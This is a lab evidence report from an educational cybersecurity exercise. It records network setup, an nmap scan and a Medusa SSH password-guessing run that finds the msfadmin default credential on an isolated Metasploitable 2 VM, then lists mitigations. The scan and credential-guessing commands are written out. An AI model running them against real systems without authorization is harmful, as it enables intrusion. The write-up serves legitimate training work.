# Laboratory evidence — verified terminal observations

**Date:** 2026-11-08  
**Scope:** DIO / Santander Cybersecurity educational exercise  
**Target:** isolated, intentionally vulnerable Metasploitable 2 machine at `192.168.77.20`  
**Tester:** Kali Linux guest at `192.168.77.10`  
**Network:** Oracle VirtualBox Internal Network `dio-cyber-lab`

> **Evidence provenance:** The values below were **transcribed from screenshots provided during the hands-on session**. These are deliberately selected excerpts, **not raw unmodified output files**. No unseen commands, unobserved findings, or further brute-force scenarios are represented as executed. Screenshots were retained in the training conversation but have not been added to GitHub.

## 1. IPv4 configuration and connectivity

After applying a static address to the Kali guest, `ifconfig eth0` displayed:

```text
inet 192.168.77.10  netmask 255.255.255.0  broadcast 192.168.77.255
```

The Metasploitable guest displayed its assigned address:

```text
inet addr:192.168.77.20  Bcast:192.168.77.255  Mask:255.255.255.0
```

Observed Kali test:

```bash
ping -c 4 192.168.77.20
```

Selected observed output:

```text
64 bytes from 192.168.77.20: icmp_seq=1 ttl=64 time=3.09 ms
64 bytes from 192.168.77.20: icmp_seq=2 ttl=64 time=2.08 ms
64 bytes from 192.168.77.20: icmp_seq=3 ttl=64 time=1.86 ms
64 bytes from 192.168.77.20: icmp_seq=4 ttl=64 time=1.29 ms

4 packets transmitted, 4 received, 0% packet loss, time 3003ms
rtt min/avg/max/mdev = 1.294/2.081/3.085/0.647 ms
```

**Conclusion:** The two test VMs were mutually reachable over the configured virtual lab network.

## 2. TCP service discovery

Command executed on the Kali guest:

```bash
nmap -sT 192.168.77.20
```

Selected observed ports from the terminal screenshot:

```text
22/tcp    open  ssh
23/tcp    open  telnet
25/tcp    open  smtp
53/tcp    open  domain
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
5432/tcp  open  postgresql
5900/tcp  open  vnc

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
```

**Conclusion:** Multiple services were reachable; the scan did not by itself prove a vulnerability.

## 3. Medusa SSH authentication check

On the **isolated lab target only**, a two-item wordlist was prepared using a deliberately incorrect test password and the Metasploitable 2 default training password. No real or leaked credentials were used.

```bash
echo senha_errada > senhas.txt
echo msfadmin >> senhas.txt
medusa -h 192.168.77.20 -u msfadmin -P senhas.txt -M ssh -t 1 -f
```

Selected verified terminal fields (line wrapping shortened for readability):

```text
Medusa v2.3
ACCOUNT CHECK: [ssh] Host: 192.168.77.20 User: msfadmin Password: senha_errada
ACCOUNT CHECK: [ssh] Host: 192.168.77.20 User: msfadmin Password: msfadmin
ACCOUNT FOUND: [ssh] Host: 192.168.77.20 User: msfadmin Password: msfadmin [SUCCESS]
```

**Observed result:** 2 candidates were checked, and 1 known training credential was reported valid. The command returned to the shell prompt.

**Interpretation:** This demonstrated the risk of a still-enabled default account and password on an intentionally insecure training system. It does not show a real-world breach, a large-scale brute-force campaign, or an account lockout bypass.

## 4. Recommended mitigations

- Disable or replace vendor/default credentials.
- Require unique, strong passphrases or SSH public-key authentication.
- Restrict remote administration to authorized network paths.
- Monitor and alert on repeated authentication failures and unexpected successes.
- Use rate limiting, lockout controls, and MFA where available.
- Do not expose vulnerable lab services to production or public networks.

## 5. Incomplete or unverified work

FTP, DVWA web-form authentication, and SMB/password-spraying demonstrations referenced in the broader DIO challenge were **not executed** in the evidenced session. They should not be presented as completed.

The current record is suitable as a **documented, limited SSH adaptation** of the hands-on exercise. Acceptance is determined by DIO's evaluation requirements.
